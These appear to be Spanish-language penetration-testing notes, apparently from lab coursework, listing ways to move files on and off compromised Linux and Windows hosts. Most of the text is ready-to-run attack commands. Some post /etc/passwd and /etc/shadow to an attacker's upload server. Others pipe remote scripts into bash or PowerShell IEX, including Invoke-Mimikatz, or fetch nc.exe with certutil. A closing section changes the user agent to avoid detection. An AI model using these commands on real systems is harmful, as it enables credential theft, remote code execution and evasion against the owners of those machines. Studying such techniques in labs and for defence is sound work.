# LINUX
## Download
### Encode b64
cat id_rsa | base64 -w 0; echo
echo -n 'string' | base64 -d 

### Descargarlo de remoto
wget url -O archivo
curl -o archivo url

si por algún motivo no podemos escribir, podemos ejecutar remotamente

curl url | bash
wget -q0- url | python3

### Con TCP
exec 3<>/dev/tcp/nuestraip/80
echo -e "GET /archivo HTTP/1.1\n\n">&3
cat <&3

### Con SCP
scp user@ip:/archivo .

## Upload

### Uploadserver

```bash
sudo python3 -m pip install --user uploadserver
#CERT // No hostear el archivo
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
#UP
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
#Subir archivos comprometidos
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

Si no disponemos de eso en la víctima, hay más opciones:

```bash
python3 -m http.server
php -S 0.0.0.0:8000
ruby -run -ehttpd . -p8000
```

Para acceder a esos archivos, usamos wget en nuestro host

### SCP
Para subir con scp:

```bash
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```


# Windows
## Download

### Base64
Encriptar el archivo:

```bash
cat id_rsa | base64 -w 0; echo
```

Desencriptar en windows
```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("STRING"))
```

Comprobar hash:
```powershell
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

### Certutil
```powershell
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```
### Powershell

|**Method**|**Description**|
|---|---|
|OpenRead|Devuelve los datos del recurso como stream.
|OpenReadAsync|Devuelve los datos del recurso sin bloquear el hilo (asíncrono)|
|DownloadData|Devuelve un array de bytes|
|DownloadDataAsync|Devuelve array de bytes sin bloquear el hilo|
|DownloadFile|Descarga datos a un archivo local|
|DownloadFileAsync|Descarga datos a un archivo local asíncrono|
|DownloadString|Descarga string y devuelve string|
|DownloadStringAsync|Descarga string asíncrono|


Ej:
```powershell
(New-Object Net.WebClient).DownloadFile('URL','Output')
```

### Sin archivos, con IEX
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```
Con pipe:
```powershell
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

iwr/curl/wget
```powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

https://gist.github.com/HarmJ0y/bb48307ffa663256e239

Para errores con IE engine, usar -UseBasicParsing
```powershell
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```


Para errores con SSL/TLS --> 

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### Con SMB
En nuestra máquina arrancamos el servidor SMB con impacket:
```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -pass test
```
Para descargar los archivos solo hay que hacer 'copy \\\ip \share\nc.exe'

Puede dar error, para ello montamos el servidor smb:

```powershell
net use n: \\ip\share /user:test test
```

### Con FTP

Podemos arrancar el servidor FTP con pyftpdlib
Con DownloadFile podemos descargar esos archivos

## Upload
### B64
Para encriptar algo a b64 en windows:
```powershell
[Convert]::ToBase64String((Get-Content -path "pathtofile" -Encoding byte))
```

Estos datos en b64 los podemos enviar:
```powershell
Invoke-WebRequest -Uri http://ip:puerto/ -Method POST -Body $b64
```

El listener en nuestra máquina:
```bash
nc -lvnp 8000
```
### UploadServer
https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1
```powershell
> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

> Invoke-FileUpload -Uri http://ip:puerto/upload -File C:\Windows\System32\drivers\etc\hosts
```

### Con WebDAV (wsgidav & cheroot)
```shell
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

con eso activo podemos conectarnos:
```powershell
dir \\ip\DavWWWRoot
copy C:\source \\ip\DavWWWRoot|carpeta
```
DavWWWRoot es keyword reservada para la raíz del servidor

**Este método se usa para bypassear restricciones de SMB, si no hay, se puede usar la herramienta impacket**

### Con FTP
```shell
sudo python3 -m pyftpdlib --port 21 --write
```

```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```


# Mediante código
## Download

```shell
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

```shell
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

```shell
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

```shell
php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

```shell
#Pipe a Bash
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

```shell
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

```shell
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

### Javascript
```javascript
//wget.js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

```powershell
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

### VBS
```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

```powershell
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

## Upload

Abrir uploadserver de python!!
```shell
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

# Otros
### Con netcat
```shell
#Maquina comprometida
nc -l -p 8000 > archivo
ncat -l -p 8000 --recv-only > archivo
```

```shell
#Attacker
nc -q 0 192.168.49.128 8000 < archivo
ncat --send-only 192.168.49.128 8000 < archivo
```

Estos métodos implican una conexión a la máquina víctima, que puede estar bloqueado por un firewall. Para que la conexión desde la máquina víctima sea saliente:
```shell
#Attacker
sudo nc -l -p 443 -q 0 < archivo
sudo ncat -l -p 443 --send-only < archivo

```

```shell
#Víctima
nc 192.168.49.128 443 > archivo
ncat 192.168.49.128 443 --recv-only > archivo
```
Si en la víctima no disponemos de ncat, podemos tirar de tcp:
```shell
cat < /dev/tcp/192.168.49.128/443 > archivo
```

### WinRM (AD)
Desde DC01 (máquina comprometida)
```powershell
$Session = New-PSSession -ComputerName DATABASE01
```
DATABASE01 es el sitio de donde queremos sacar los archivos
```powershell
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```


### RDP
Si nos conectamos con RDP (xfreerdp, rdesktop), podemos añadir un directorio local para montar en la máquina víctima
```shell
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'

xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```
Este directorio se monta en \\\tsclient\


https://lolbas-project.github.io/ /download /upload (WIN)
https://gtfobins.github.io/ +file download|upload (Linux)


# Protección en las transferencias de archivos
## Cifrado AES
Necesitamos este script en windows: https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1

```powershell
Import-Module .\Invoke-AESEncryption.ps1
```
```powershell
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
```
Esto nos crea un scan-results.txt.aes con la contraseña especificada

```powershell
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Path file.bin.aes
```
Esto lo desencripta

En Linux podemos usar OpenSSL
```shell
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
```

```shell
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```

Para ambos procesos nos pedirá interactivamente introducir la contraseña

A parte de usar el uploadserver de python, podemos usar nginx
Hay que crear un directorio en /var/www/uploads, y darle el owner a www-data

```conf
//  /etc/nginx/sites-available/upload.conf

server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

```shell
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
sudo systemctl restart nginx.service
```

El servidor ya está listo
Se pueden subir archivos con cURL
```shell
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```

Por http, podemos evitar ser detectados cambiando el user agent:
```
Name       : InternetExplorer
User Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)

Name       : FireFox
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0

Name       : Chrome
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0
             Safari/534.6

Name       : Opera
User Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1

Name       : Safari
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0
             Safari/533.16
```

Descargar netcat con useragent:
```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome

Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

